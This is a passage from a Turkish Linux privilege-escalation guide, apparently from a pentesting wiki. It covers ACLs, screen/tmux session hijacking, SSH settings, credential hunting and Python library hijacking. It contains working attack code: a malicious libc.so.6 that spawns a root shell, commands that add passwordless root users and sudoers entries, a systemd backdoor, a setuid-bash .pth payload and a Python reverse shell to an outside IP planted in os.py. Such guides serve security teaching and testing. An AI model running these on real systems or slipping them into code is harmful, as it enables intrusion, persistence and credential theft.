 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Ardından `/var/tmp` içinde şu komutla kötü amaçlı bir kütüphane oluşturun: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities, **bir süreç için kullanılabilir root ayrıcalıklarının bir alt kümesini sağlar**. Bu, root **ayrıcalıklarını daha küçük ve birbirinden bağımsız birimlere böler**. Bu birimlerin her biri süreçlere bağımsız olarak verilebilir. Böylece ayrıcalıkların tamamı azaltılır ve istismar riskleri düşürülür.\
**Capabilities ve bunların nasıl kötüye kullanılabileceği hakkında daha fazla bilgi edinmek için** aşağıdaki sayfayı okuyun:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde **"execute" biti**, etkilenen kullanıcının klasöre "**cd**" yapabilmesini sağlar.\
**"read" biti**, kullanıcının **dosyaları listeleyebilmesini**; **"write" biti** ise **dosyaları silebilmesini** ve yeni **dosyalar oluşturabilmesini** sağlar.

## ACLs

Access Control Lists (ACLs), **geleneksel ugo/rwx izinlerini geçersiz kılabilen** ikincil bir isteğe bağlı izin katmanını temsil eder. Bu izinler, sahip olmayan veya grubun parçası olmayan belirli kullanıcılara hak vererek ya da bu hakları reddederek dosya veya dizin erişimi üzerindeki denetimi artırır. Bu **ayrıntı düzeyi, erişimin daha hassas biçimde yönetilmesini sağlar**. Daha fazla ayrıntı için [**buraya**](https://linuxconfig.org/how-to-manage-acls-on-linux) bakın.<sup>[[19]](#references)</sup>

"kali" kullanıcısına bir dosya üzerinde okuma ve yazma izinleri **verin**:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Sistemde belirli ACL'lere sahip dosyaları bulun:**

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-in dosyalarında gizli ACL arka kapısı

Yaygın bir yanlış yapılandırma, `/etc/sudoers.d/` içinde `440` moduna sahip ancak ACL aracılığıyla düşük ayrıcalıklı bir kullanıcıya hâlâ yazma izni veren root sahipli bir dosyadır.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

`user:alice:rw-` gibi bir şey görürseniz, kullanıcı kısıtlayıcı mode bitlerine rağmen bir sudo kuralı ekleyebilir:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Bu, etkisi yüksek bir ACL kalıcılık/privilege escalation yoludur; çünkü yalnızca `ls -l` ile yapılan incelemelerde kolayca gözden kaçabilir.

## Açık shell oturumları

Kullanıcılar arası GNU Screen erişimi yalnızca sürüme değil, **çalışan oturumun yapılandırmasına ve ACL'sine** bağlıdır. [GNU Screen belgelerine](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) göre, multiuser desteğiyle derlenmiş olmalıdır; `multiuser on` ve bir `acladd` veya uygun bir `aclchg` izni başka bir kullanıcının oturuma attach olmasına olanak tanır. [Kılavuz, kullanıcılar arası oturum araması için setuid-root da gerektirir](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html). Görülebilen root sahipli bir socket veya SUID `screen` binary'si tek başına, root shell'ine attach olunabileceğini göstermez. Bunu privilege escalation olarak değerlendirmeden önce canlı oturumun multiuser olduğunu, mevcut kullanıcının etkin input/komut izinlerine sahip olduğunu ve oturumdaki shell'in ayrıcalıklı sahibi olarak çalıştığını doğrulayın.

### screen oturumlarını ele geçirme

**screen oturumlarını listeleme**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Soket konumları (bazı sistemlerde biri diğerinin sembolik bağlantısı olarak sunulur): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Bir oturuma bağlan**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Bu, **eski tmux sürümlerinde** görülen bir sorundu. Ayrıcalıksız bir kullanıcı olarak root tarafından oluşturulmuş bir tmux (v2.1) oturumunu ele geçiremedim.

**tmux oturumlarını listele**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket konumları (bazı sistemlerde biri diğerinin sembolik bağlantısı olarak sunulur) - tmux oturumlarını ele geçirme: tmux -S /tmp/dev sess ls Bu socket'i kullanarak listeleyin; bu socket'te bir tmux oturumu başlatabilirsiniz...](<../../images/image (837).png>)

**Bir oturuma bağlanın**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Örnek için **HTB'deki Valentine box**'a bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Etkilenen Debian veya türevi OpenSSL derlemeleriyle, tarihsel güvenlik açığı döneminde oluşturulan anahtarların rastgeleliği tahmin edilebilir olabilir; ana makinenin mevcut dağıtımı veya yamalı OpenSSL sürümü, eski bir anahtarın nasıl oluşturulduğunu göstermez. **Belirli anahtarı** uygun bir tarihsel kara listeye ve kaynağına göre kontrol edin. Debian'ın [`ssh-vulnkey` kılavuzu](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html), açık anahtarların ve `authorized_keys` dosyalarının kontrol edilmesini açıklar; [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) ise OpenSSL düzeltmesini kaydeder. Yetkili bir hesabın `authorized_keys` dosyasındaki bir kayıt, yalnızca eşleşen özel anahtar elde edilebiliyorsa ve geçerli SSH ilkeleri bu anahtarın söz konusu hesap için kullanılmasına hâlâ izin veriyorsa bir yetki yükseltme ipucudur; zayıf bir **ana makine** anahtarı tek başına oturum açma kimlik bilgisi değildir. Ele geçirilmiş anahtarları değiştirin ve eski yetkilendirmelerini kaldırın.

### SSH İlginç yapılandırma değerleri

- **PasswordAuthentication:** Parola kimlik doğrulamasına izin verilip verilmediğini belirtir. OpenSSH'nin yukarı akış varsayılanı `yes` değeridir; dağıtım yapılandırması bunu geçersiz kılabilir.
- **PubkeyAuthentication:** Açık anahtar kimlik doğrulamasına izin verilip verilmediğini belirtir. Varsayılan değer `yes`'tir.
- **PermitEmptyPasswords**: Parola kimlik doğrulamasına izin verildiğinde, sunucunun boş parola dizelerine sahip hesaplarda oturum açılmasına izin verip vermediğini belirtir. Varsayılan değer `no`'dur.

### Oturum açma denetim dosyaları

Bu dosyalar kimin ve nasıl oturum açabileceğini etkiler:

- **`/etc/nologin`**: varsa, root dışındaki kullanıcıların oturum açmasını engeller ve iletisini gösterir.
- **`/etc/securetty`**: root'un nereden oturum açabileceğini sınırlar (TTY izin listesi).
- **`/etc/motd`**: oturum açma sonrası başlık (ortam veya bakım ayrıntılarını sızdırabilir).

### PermitRootLogin

Root'un SSH kullanarak oturum açıp açamayacağını belirtir. OpenSSH'nin yukarı akış varsayılanı `prohibit-password` değeridir; dağıtım yapılandırması bunu geçersiz kılabilir. Olası değerler:

- `yes`: root parola ve özel anahtar kullanarak oturum açabilir
- `without-password` veya `prohibit-password`: root yalnızca özel anahtarla oturum açabilir
- `forced-commands-only`: Root yalnızca özel anahtar kullanarak ve komut seçenekleri belirtilmişse oturum açabilir
- `no` : oturum açamaz

### Güvenilen SSH kullanıcı sertifikası yetkilileri

`TrustedUserCAKeys`, sshd'nin **kullanıcı** sertifikalarını imzalamak için güvendiği açık anahtarları belirtir. İlgili özel CA anahtarı daha düşük yetkili bir kullanıcı tarafından okunabiliyorsa, kimin sertifika alabileceğini ve bu sertifikanın hangi hesap adlarıyla kimlik doğrulayabileceğini inceleyin. `AuthorizedPrincipalsFile` veya `AuthorizedPrincipalsCommand` kabul edilen adları kısıtlayabilir; ikisi de yapılandırılmamışsa sertifikanın hedef hesap adını içermesi gerekir. `PermitRootLogin prohibit-password`, root için parola kimlik doğrulamasını engeller ancak sertifika kimlik doğrulamasına izin verebilir. Açığa çıkmış bir anahtar yolu tek başına erişimi kanıtlamaz: açık/özel anahtar çiftini, geçerli `Match` kurallarını, hesap ilkesini, anahtar parolasını, iptali ve kabul edilen imza algoritmalarını doğrulayın. Özel anahtar baytlarını keşif çıktısına eklemeyin. [OpenSSH sunucu yapılandırma kılavuzuna](https://man.openbsd.org/sshd_config#TrustedUserCAKeys) bakın.

Özel CA anahtarı, ayrıcalık devri kuralı kullanıcının anahtar sahibinin kimliğiyle kısıtlanmamış bir [sertifika imzalayıcıyı (örneğin `ssh-keygen -s`)](https://man.openbsd.org/ssh-keygen#-s) çalıştırmasına izin veriyorsa, mevcut kullanıcı tarafından **okunamasa bile** kullanılabilir olabilir. İzin verilen tam komut ve bağımsız değişkenleri; imzalayıcı hesabının anahtara erişimi, geçerli sshd yapılandırmasının güvendiği açık CA anahtarı, hedef hesap için kabul edilen principal, sertifika geçerliliği ve hesabın oturum açma ilkesiyle karşılaştırın. Yetki devredilmiş bir imzalayıcı komutu veya güvenilen bir CA dosyası tek başına başka bir hesaba erişimi kanıtlamaz; pasif keşif sırasında test sertifikası imzalamayın.

Hesap başına ayrı CA güven yolu için [SSH sertifikası principal ayırıcı karmaşası](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion) bölümüne bakın.

### AuthorizedKeysFile

Kullanıcı kimlik doğrulaması için kullanılabilecek açık anahtarları içeren dosyaları belirtir. Ana dizinle değiştirilecek `%h` gibi belirteçler içerebilir. **Mutlak yollar** (`/` ile başlayan) veya **kullanıcının ana dizinine göreli yollar** belirtebilirsiniz. Örneğin:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Bu yapılandırma, "**testusername**" kullanıcısının **private** key'iyle giriş yapmaya çalıştığınızda ssh'nin key'inizin public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` konumlarındakilerle karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (passphrase içermeyen!) key'ler bırakmak yerine **yerel SSH key'lerinizi kullanmanızı** sağlar. Böylece ssh ile **bir host'a atlayabilir** ve oradan **ilk host'unuzda bulunan key'i kullanarak** başka bir host'a **atlayabilirsiniz**.

Bu seçeneği `$HOME/.ssh.config` dosyasında şu şekilde ayarlamanız gerekir:

```
Host example.com
  ForwardAgent yes
```

`Host` her seferinde kullanıcı farklı bir makineye geçtiğinde `*` ise, bu host anahtarlara erişebilir (bu bir güvenlik sorunudur).

`/etc/ssh_config` dosyası bu **options** ayarlarını **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya vermeyebilir.\
`/etc/sshd_config` dosyası `AllowAgentForwarding` anahtar sözcüğüyle ssh-agent forwarding'e **izin verebilir** veya vermeyebilir (varsayılan olarak izin verilir).

Bir ortamda Forward Agent'ın yapılandırıldığını bulursanız, aşağıdaki sayfayı inceleyin; **yetkileri yükseltmek için bundan yararlanabilirsiniz**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profile dosyaları

`/etc/profile` dosyası ve `/etc/profile.d/` altındaki dosyalar, **kullanıcı yeni bir shell başlattığında çalıştırılan scriptlerdir**. Bu nedenle, bunlardan herhangi birine **yazabilir veya onları değiştirebilirseniz yetkilerinizi yükseltebilirsiniz**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Tuhaf bir profile script bulunursa **hassas bilgileri** içerip içermediğini kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir ad kullanıyor olabilir veya yedekleri bulunabilir. Bu nedenle hepsini **bulmanız** ve dosyaların içinde **hash'ler olup olmadığını** görmek için onları **okuyup okuyamadığınızı kontrol etmeniz** önerilir:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyasının içinde **parola hash'leri** bulabilirsiniz.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Ardından `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Örn: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `hacker:hacker` ile `su` komutunu kullanabilirsiniz.

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: makinenin mevcut güvenliğini zayıflatabilirsiniz.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOT: BSD platformlarında `/etc/passwd`, `/etc/pwd.db` ve `/etc/master.passwd` konumlarında bulunur; ayrıca `/etc/shadow` dosyasının adı `/etc/spwd.db` olarak değiştirilmiştir.

**Hassas dosyalara yazıp yazamadığınızı** kontrol etmelisiniz. Örneğin, herhangi bir **servis yapılandırma dosyasına** yazabiliyor musunuz?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **/etc/systemd/ içindeki Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** şu satırları değiştirebilirsiniz:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Edin

Aşağıdaki klasörlerde yedekler veya ilginç bilgiler bulunabilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamazsınız ama yine de deneyin)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Şüpheli Konumlar/Sahip Olunan Dosyalar

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Son dakikalarda değiştirilen dosyalar

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### SQLite DB dosyaları

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Okunabilir uygulama veritabanlarında kullanıcı adları ve parola hash'leri için tablo ve sütun adlarını inceleyin. Bir hash bulmak, parolasını çözmek ve bu parolanın yerel bir hesapta yeniden kullanıldığını kanıtlamak ayrı adımlardır; 32 karakterlik sıradan bir onaltılık dize, MD5 olduğunu veya hesaba erişim sağladığını çıkarsamak için yeterli değildir.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Okunabilir bir shell history içinde kısa ve şifreye benzeyen bir satırın ardından `sudo` komutu varsa çevresindeki satırları elle inceleyin. Normal `sudo` istemine girilen bir parola shell history'ye kaydedilmez; sonraki satır yalnızca yanlışlıkla shell'e girilmiş olabilecek bir girdidir, geçerli bir parolanın kanıtı değildir. `.sudo_as_admin_successful` işaretçisi, daha önce kullanım olduğunu kaydeder; mevcut yetkilendirmeyi göstermez.

### Gizli dosyalar

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH'teki Script/Binary'ler**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Web dosyaları**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Yedekler**

Yedekleme dizinlerindeki okunabilir dosyaları ve **adlarında** `backup` geçen dosyaları inceleyin: adı anlaşılmaz olan veya şifreli uzantıya sahip bir arşivde bile eski uygulama verileri açığa çıkabilir. Şifreli bir arşiv yalnızca olası bir maruziyet göstergesidir. Parolanın kurtarılması, içeriğinin incelenmesi, bir uygulama hash'inin kurtarılması ve bu parolanın Unix hesabında yeniden kullanılması, ayrı ayrı doğrulanması gereken adımlardır; bir arşivde hash bulunması yerel oturum açılabildiğini kanıtlamaz.

Okunabilir sanal makine yedekleri de aynı şekilde incelenmelidir. Bir VirtualBox `.vbox` yapılandırma dosyası, bağlı `.vdi` imajlarını belirleyebilir ve şifreli disk anahtarı meta verilerini içerebilir; [VirtualBox, şifreli veri anahtarının VM yapılandırmasında saklandığını belgeliyor](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Çevrimdışı disk incelemesi yapabilmek için hem yapılandırma dosyasına hem de imaja erişilebilmelidir. Konuk birimde ayrıca ayrı bir anahtar gerektiren kendi [LUKS şifreleme katmanı](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc) bulunabilir. Yetkili şekilde şifre çözme işlemi yapıldıktan sonra bile eski betikler veya yapılandırma dosyaları parola içerebilir; bunu yerel bir yetki yükseltme olarak değerlendirmeden önce kimlik bilgisinin ana bilgisayar hesabında hâlen geçerli olduğunu ve hesabın etkin `sudo` politikasının ayrıcalıklı bir komuta izin verdiğini doğrulayın. Pasif keşif sırasında imajları kopyalamadan, şifrelerini çözmeden veya bağlamadan yolların ve izinlerin envanterini çıkarın.

Okunabilir bir arşivi incelerken herhangi bir şeyi çıkarmadan önce üye adlarını listeleyin: canlı kopyalar korumalı olsa bile gizli kimlik doğrulayıcı dosyalar, kurtarma kodu materyalleri veya SSH anahtarları bulunabilir. Dosya adları yalnızca bir ipucudur; materyali ve hesaplarda yeniden kullanılıp kullanılmadığını ayrıca doğrulayın.

Yedekleme dizinlerinde başka bir kullanıcıya ait **okunabilir arşivlere**, özellikle root'a ait ve grup üyeliği üzerinden erişilebilen arşivlere öncelik verin. Canlı kopya korumalı olsa bile eski bir arşiv yapılandırma veya kimlik doğrulama sırrı içerebilir. [Backrest](https://garethgeorge.github.io/backrest/) gibi yerel bir yedekleme arayüzü için hizmetin etkin hesabını ve daha düşük ayrıcalıklı bir kullanıcının yapılandırmasını okuyup okuyamadığını veya arayüzde kimlik doğrulaması yapıp yapamadığını kontrol edin. [Hooks](https://garethgeorge.github.io/backrest/docs/hooks) ve [restic komut arayüzü](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto), hizmet arka plan sürecinin dosya ve komut ayrıcalıklarıyla çalışabilir; yalnızca loopback üzerinde dinleniyor olması etkinin kapsamını belirlemez. Backrest'in `passwordBcrypt` değeri, [kimlik doğrulama kodunda](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go) bulunan base64 kodlamalı bir bcrypt hash'idir; düz metin parola değildir. Açığa çıkan bir arşivi veya arayüzü ayrıcalık sınırı olarak değerlendirmeden önce hizmet kimliğini, kullanılabilir kimlik bilgilerini ve ilgili plana ya da depoya erişimi doğrulayın.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Parola içerebilen bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin; **parola içerebilecek çeşitli dosyaları** arar.\
Bunu yapmak için kullanabileceğiniz **bir başka ilginç araç** da şudur: Windows, Linux ve Mac için yerel bir bilgisayarda depolanan çok sayıda parolayı kurtarmak için kullanılan açık kaynaklı bir uygulama olan [**LaZagne**](https://github.com/AlessandroZ/LaZagne).

`/etc/guacamole/guacamole.properties` dosyası okunabiliyorsa `mysql-*`, `postgresql-*` veya `sqlserver-*` veritabanı bağlantı ayarlarını inceleyin. Hesap Guacamole JDBC tablolarını okuma yetkisine sahipse `guacamole_connection_parameter` tablosunda kayıtlı SSH `username`, `password`, `private-key` veya `passphrase` değerleri bulunabilir. Bağlantı kimlikleri ve parametre adlarıyla başlayın, ardından yalnızca ilgili satırları inceleyin; kayıtlı bir değer, yeniden kullanılabilir bir sır yerine dinamik bir token veya vault referansı olabilir. [Guacamole JDBC şemasına](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) ve [SSH bağlantı parametrelerine](https://guacamole.apache.org/doc/gug/configuring-guacamole.html) bakın.

[pswm parola yöneticisi](https://github.com/Julynx/pswm#usage), varsayılan olarak `~/.local/share/pswm/pswm` konumunda şifreli bir kasa tutar. Başka bir kullanıcının kasası görünüyorsa sahipliğini ve hesabınızın kasayı gerçekten okuyup okuyamadığını kontrol edin. Kasa yolu tek başına kimlik bilgilerini açığa çıkarmaz; ana parolasını kurtarmak, yeniden kullanılabilir bir hesap parolası bulmak ve bu hesabın ayrıcalıklarını doğrulamak birbirinden ayrı adımlardır.

[Passpie'nin varsayılan veritabanı](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database), grup dizinlerinde bir `.keys` anahtarlığı ve şifreli `.pass` kimlik bilgisi dosyaları bulunan `~/.passpie/` dizinidir. Görünür bir veritabanı dizini yalnızca bir yol ipucudur: anahtara ve ilgili şifreli kayda erişiminiz olduğunu, gerekli ana parola ifadesini ve kurtarılan kimlik bilgisinin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Passpie ayrıca [özel veritabanı yollarını](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases) destekler; bu nedenle varsayılan yol tüm olasılıkları kapsamaz. Otomatik numaralandırma, kimlik bilgilerini dışa aktarmadan veya anahtar malzemesini yazdırmadan meta verileri listelemelidir.

### Günlükler

Günlükleri okuyabiliyorsanız, içlerinde **ilginç/gizli bilgiler** bulabilirsiniz. Günlük ne kadar tuhafsa o kadar ilginç olacaktır (muhtemelen).\
Ayrıca, "**kötü**" yapılandırılmış (backdoored?) bazı **denetim günlükleri**, bu yazıda açıklandığı gibi **parolaları denetim günlüklerine kaydetmenize** olanak tanıyabilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Logları **okumak için** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) grubu çok işinize yarayacaktır.

### Shell dosyaları

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Generic Creds Arama/Regex

Ayrıca **adında** veya **içeriğinde** "**password**" kelimesi bulunan dosyaları kontrol etmeli; loglarda IP adresleri ve e-postaları, ayrıca hash regex'lerini aramalısınız.\
Bunların tümünün nasıl yapılacağını burada listelemeyeceğim; ancak ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Bir Python script'inin **nereden** çalıştırılacağını biliyorsanız ve o klasöre **yazabiliyorsanız** ya da Python kütüphanelerini **değiştirebiliyorsanız**, OS kütüphanesini değiştirip backdoor ekleyebilirsiniz (Python script'inin çalıştırılacağı yere yazabiliyorsanız os.py kütüphanesini kopyalayıp yapıştırın).

**Kütüphaneye backdoor eklemek** için os.py kütüphanesinin sonuna aşağıdaki satırı ekleyin (IP ve PORT değerlerini değiştirin):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `site.addsitedir()` tarafından işlenen yazılabilir `.pth`

`site.addsitedir(DIR)` işlevini `sys.path.append(DIR)` ile eşdeğer görmeyin. Bu işlev ayrıca `DIR` içindeki her `*.pth` dosyasını işler. `import` ile başlayan ve ardından boşluk veya sekme gelen bir satır, Python kodu olarak yürütülür. Yol satırları ise site dizinine göre çözümlenir ve yalnızca mevcutlarsa eklenir.<sup>[[38]](#references)</sup>

Sudo kullanımına izin verilen veya başka şekilde ayrıcalıklı bir Python programı, mevcut kullanıcı ya da gruplarından biri tarafından yazılabilir bir dizinde `site.addsitedir()` çağırdığında bu durum privilege escalation'a yol açar. `.pth` kodu, ayrıcalıklı program import yolunu ayarlarken ve normal işlemi başlatmadan önce yürütülür.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Çalıştırılabilir `.pth` içeriği tek satırda olmalıdır, ancak noktalı virgüller birden fazla ifadeye izin verir. Örneğin, root yetkisiyle yürütülen bir kod setuid Bash kopyası oluşturabilir; etkin kimliğini koruması için Bash’i `-p` ile çalıştırın.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

`-S` seçeneği yalnızca Python'ın otomatik `site` başlatmasını devre dışı bırakır. `site` modülünü açıkça içe aktarıp `site.addsitedir()` çağıran bir programı korumaz. Saldırganın yazabildiği dizinleri ayrıcalıklı içe aktarma yollarından kaldırın ve dizinin ve `.pth` dosyalarının yalnızca ayrıcalıklı yönetici tarafından sahiplenilip yazılabilir olmasını zorunlu kılın.<sup>[[38]](#references)[[39]](#references)</sup>

### Logrotate istismarı

